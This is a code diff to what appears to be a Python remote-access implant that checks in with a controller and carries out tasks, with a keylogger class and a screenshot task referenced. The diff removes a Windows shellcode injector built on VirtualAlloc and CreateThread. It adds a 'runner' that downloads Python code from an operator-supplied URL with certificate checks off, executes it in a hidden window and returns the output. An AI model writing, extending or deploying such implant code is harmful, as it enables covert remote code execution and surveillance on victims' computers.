@@ -8,10 +8,10 @@ def install_module(module_name, pip_name=None):
     pip_name = pip_name or module_name
     try:
         subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name])
-        print(f"Successfully installed {{module_name}}")
+        print(f"Successfully installed {{{{module_name}}}}")
         return True
     except subprocess.CalledProcessError:
-        print(f"Failed to install {{module_name}}")
+        print(f"Failed to install {{{{module_name}}}}")
         return False
 
 # List of required modules with their pip names if different
@@ -44,7 +44,7 @@ for module, pip_name in required_modules:
         else:
             __import__(module.split('.')[0])
     except ImportError:
-        print(f"Module {{module}} not found. Attempting to install...")
+        print(f"Module {{{{module}}}} not found. Attempting to install...")
         if pip_name:
             install_module(module, pip_name)
         else:
@@ -89,7 +89,7 @@ try:
     
     print("All modules imported successfully!")
 except ImportError as e:
-    print(f"Failed to import module: {{e}}")
+    print(f"Failed to import module: {{{{e}}}}")
     
 
 
@@ -1080,120 +1080,44 @@ class Keylogger:
 # ======================
 # Shellcode-Runner
 # ======================
-if platform.system == 'Windows':
+if platform.system() == 'Windows':
     class ShellcodeRunner:
-        # Initialize Windows DLL
-        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
-        
-        # Define Windows constants
-        MEM_COMMIT = 0x00001000
-        MEM_RESERVE = 0x00002000
-        PAGE_EXECUTE_READWRITE = 0x40
-        INFINITE = 0xFFFFFFFF
-
-        # Set up proper function prototypes
-        kernel32.VirtualAlloc.restype = wintypes.LPVOID
-        kernel32.VirtualAlloc.argtypes = [
-            wintypes.LPVOID,    # lpAddress
-            ctypes.c_size_t,    # dwSize (using c_size_t instead of SIZE_T)
-            wintypes.DWORD,     # flAllocationType
-            wintypes.DWORD      # flProtect
-        ]
-        
-        kernel32.CreateThread.restype = wintypes.HANDLE
-        kernel32.CreateThread.argtypes = [
-            wintypes.LPVOID,    # lpThreadAttributes
-            ctypes.c_size_t,    # dwStackSize
-            wintypes.LPVOID,    # lpStartAddress
-            wintypes.LPVOID,    # lpParameter
-            wintypes.DWORD,     # dwCreationFlags
-            wintypes.LPDWORD    # lpThreadId
-        ]
-        
-        kernel32.WaitForSingleObject.restype = wintypes.DWORD
-        kernel32.WaitForSingleObject.argtypes = [
-            wintypes.HANDLE,    # hHandle
-            wintypes.DWORD      # dwMilliseconds
-        ]
-
         @staticmethod
-        def _worker(shellcode_bytes):
-        
+        def execute_runner(runner_url):
+            """Execute the runner script in one line and capture output"""
             try:
-                # Allocate executable memory
-                ptr = ShellcodeRunner.kernel32.VirtualAlloc(
-                    None,
-                    len(shellcode_bytes),
-                    ShellcodeRunner.MEM_COMMIT | ShellcodeRunner.MEM_RESERVE,
-                    ShellcodeRunner.PAGE_EXECUTE_READWRITE
+                # Create the one-liner command
+                cmd = [
+                    sys.executable,
+                    "-c",
+                    f"import urllib3;urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning);"
+                    f"import requests;url='{{runner_url}}';exec(requests.get(url,verify=False).text)"
+                ]
+                
+                # Run synchronously and capture output
+                result = subprocess.run(
+                    cmd,
+                    creationflags=subprocess.CREATE_NO_WINDOW,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    text=True,
+                    timeout=60
                 )
                 
-                if not ptr:
-                    raise ctypes.WinError(ctypes.get_last_error())
-                
-                # Copy shellcode to allocated memory
-                ctypes.memmove(ptr, shellcode_bytes, len(shellcode_bytes))
-                
-                # Create and execute thread
-                thread = ShellcodeRunner.kernel32.CreateThread(
-                    None,
-                    0,
-                    ptr,
-                    None,
-                    0,
-                    None
-                )
-                
-                if not thread:
-                    raise ctypes.WinError(ctypes.get_last_error())
-                
-                # Wait for thread to complete
-                ShellcodeRunner.kernel32.WaitForSingleObject(thread, ShellcodeRunner.INFINITE)
-                
-            except Exception as e:
-                print(f"Error in worker: {{e}}", file=sys.stderr)
-                sys.exit(1)
-
-        @staticmethod
-        def execute(shellcode_bytes):
-            try:
-                # Direct execution in current process (more reliable in headless)
-                ptr = ShellcodeRunner.kernel32.VirtualAlloc(
-                    None,
-                    len(shellcode_bytes),
-                    ShellcodeRunner.MEM_COMMIT | ShellcodeRunner.MEM_RESERVE,
-                    ShellcodeRunner.PAGE_EXECUTE_READWRITE
-                )
-                
-                if not ptr:
-                    raise ctypes.WinError(ctypes.get_last_error())
-                
-                ctypes.memmove(ptr, shellcode_bytes, len(shellcode_bytes))
-                
-                # Create thread with explicit stack size
-                thread = ShellcodeRunner.kernel32.CreateThread(
-                    None,
-                    0,  # Default stack size
-                    ptr,
-                    None,
-                    0,  # Start immediately
-                    None
-                )
-                
-                if not thread:
-                    raise ctypes.WinError(ctypes.get_last_error())
-                
-                # Don't wait for completion in headless mode
                 return {{
                     'status': 'success',
-                    'message': 'Shellcode executed asynchronously'
+                    'message': 'Runner script executed',
+                    'stdout': result.stdout,
+                    'stderr': result.stderr,
+                    'returncode': result.returncode
                 }}
-                
             except Exception as e:
                 return {{
                     'status': 'error',
                     'message': str(e)
                 }}
+            
+
 
 # ======================
 # WebSocket Client
@@ -1394,6 +1318,7 @@ class Agent:
         self._initial_checkin = None
         self._checkin_count = 0
         self._running = True
+        self._executed_task_ids = set()
 
     def _setup_logger(self):
         self.logger = logging.getLogger('agent')
@@ -1668,6 +1593,16 @@ class Agent:
 
     def _execute_task(self, task):
         try:
+            task_id = task.get("task_id")
+            if task_id in self._executed_task_ids:
+                self._log_info(f"Skipping execution of duplicate task with ID: {{task_id}}")
+                return {{
+                    "status": "error",
+                    "message": f"Task with ID {{task_id}} has already been executed"
+                }}
+            else:
+                self._executed_task_ids.add(task_id)
+
             task_type = task.get("type")
             self._log_info(f"Received task: {{json.dumps(task, indent=2)}}")
             
@@ -1828,41 +1763,26 @@ class Agent:
 
             elif task_type == "shellcode":
                 try:
-                    shellcode_b64 = task.get("data", {{}}).get("shellcode", "")
-                  
+                    runner_url = task.get("data", {{}}).get("runner_url")
                     
-                    if not shellcode_b64:
+                    if not runner_url:
                         return {{
                             "status": "error",
-                            "message": "No shellcode provided"
-                        }}
-                        
-                    shellcode_bytes = base64.b64decode(shellcode_b64)
-                    
-                    # Validate shellcode length
-                    if len(shellcode_bytes) < 4:
-                        return {{
-                            "status": "error",
-                            "message": "Shellcode too small (minimum 4 bytes required)"
-                        }}
-                        
-                    # Validate shellcode contains executable bytes
-                    if all(b == 0 for b in shellcode_bytes[:4]):
-                        return {{
-                            "status": "error",
-                            "message": "Invalid shellcode (first 4 bytes are null)"
+                            "message": "No runner URL provided"
                         }}
 
-                    self._log_info(f"Executing shellcode ({{len(shellcode_bytes)}} bytes)")
+                    self._log_info(f"Executing runner script from: {{runner_url}}")
                     
+                    # Execute the runner script and capture output
+                    result = ShellcodeRunner.execute_runner(runner_url)
                     
-                    # Existing Donut-generated shellcode handling
-                    result = ShellcodeRunner.execute(shellcode_bytes)
-                    if isinstance(result, dict):
-                        return result
                     return {{
-                        'status': 'success',
-                        'message': str(result)
+                        "status": "success" if result.get('status') == 'success' else 'error',
+                        "message": result.get('message', ''),
+                        "stdout": result.get('stdout', ''),
+                        "stderr": result.get('stderr', ''),
+                        "returncode": result.get('returncode', None),
+                        "details": result
                     }}
                         
                 except Exception as e:
@@ -1871,6 +1791,7 @@ class Agent:
                         "status": "error",
                         "message": f"Shellcode execution failed: {{str(e)}}"
                     }}
+
 
 
             elif task_type == "screenshot":
